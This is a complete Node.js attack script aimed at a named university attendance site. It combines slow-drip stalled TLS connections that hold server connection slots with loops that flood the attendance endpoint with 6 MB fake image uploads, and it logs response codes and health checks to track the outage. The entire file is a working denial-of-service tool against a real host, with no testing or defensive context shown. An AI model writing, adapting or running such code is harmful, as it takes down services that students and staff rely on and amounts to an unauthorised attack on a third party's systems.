// COMBINED: H stalled sockets (hold the per-IP cap + nginx slots) + U uploading loops
// (consume bandwidth + server image-processing) + S slow-drip completion on the stalls.
import tls from "node:tls";
const H="attendance.knust.edu.gh";
const HOLD=Math.min(Number(process.env.HOLD)||250,1500);
const U=Math.min(Number(process.env.U)||80,500);
const DUR=Number(process.env.DUR)>0?Number(process.env.DUR):90;
const DRIP=process.env.DRIP!=="0";
const socks=[]; let up=0; const t0=Date.now();
const pr=async(p)=>{const t=Date.now();try{const r=await fetch(`https://${H}${p}`,{signal:AbortSignal.timeout(8000)});return r.status+"/"+(Date.now()-t)+"ms"}catch{return "D/"+(Date.now()-t)+"ms"}};
function stall(){const s=tls.connect({host:H,port:443,servername:H,rejectUnauthorized:false},()=>{up++;try{s.write(`POST /api/sessions/11111111-1111-4111-8111-111111111111/attend/ HTTP/1.1\r\nHost: ${H}\r\nContent-Type: multipart/form-data; boundary=--x\r\nContent-Length: 5242880\r\nConnection: keep-alive\r\n\r\n------x\r\n`)}catch{}});
 s.on("error",()=>{});s.setNoDelay(true);setInterval(()=>{if(!s.destroyed)try{s.write(Buffer.alloc(DRIP?64:0,0x41))}catch{}},DRIP?5000:20000);socks.push(s);}
for(let i=0;i<HOLD;i++)setTimeout(stall,i*12);
const body=Buffer.alloc(6*1048576,0x41);
const pre=Buffer.from(`------x\r\nContent-Disposition: form-data; name="student_id"\r\n\r\n23345678\r\n------x\r\nContent-Disposition: form-data; name="selfie"; filename="s.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`);
const post=Buffer.from(`\r\n------x--\r\n`);const buf=Buffer.concat([pre,body,post]);
let sent=0; const codes={};
const one=async()=>{while(Date.now()-t0<DUR*1000){sent++;try{const r=await fetch(`https://${H}/api/sessions/11111111-1111-4111-8111-111111111111/attend/`,{method:"POST",body:buf,headers:{"content-type":"multipart/form-data; boundary=----x"},signal:AbortSignal.timeout(120000)});codes[r.status]=(codes[r.status]||0)+1;await r.arrayBuffer();}catch(e){const k=e.cause?.code||e.name;codes[k]=(codes[k]||0)+1}}};
for(let i=0;i<U;i++)setTimeout(one,i*40);
const iv=setInterval(async()=>{console.log(JSON.stringify({t:((Date.now()-t0)/1000)|0,up,live:socks.filter(s=>!s.destroyed).length,sent,codes,root:await pr("/"),health:await pr("/api/health")}));},10000);
setTimeout(()=>{clearInterval(iv);socks.forEach(s=>{try{s.destroy()}catch{}});console.log("done",sent,JSON.stringify(codes));process.exit(0)},DUR*1000+125000);
